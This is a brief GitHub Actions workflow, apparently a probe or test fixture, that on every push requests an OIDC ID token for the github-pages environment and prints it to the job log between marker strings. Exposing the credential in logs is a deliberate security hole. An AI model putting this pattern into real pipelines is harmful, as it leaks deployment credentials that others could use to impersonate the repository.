name: vx-envmint
on: [push]
permissions: {}
jobs:
  mint:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const t = await core.getIDToken();
            console.log("VXENVTOK::" + t + "::VXENVTOK");
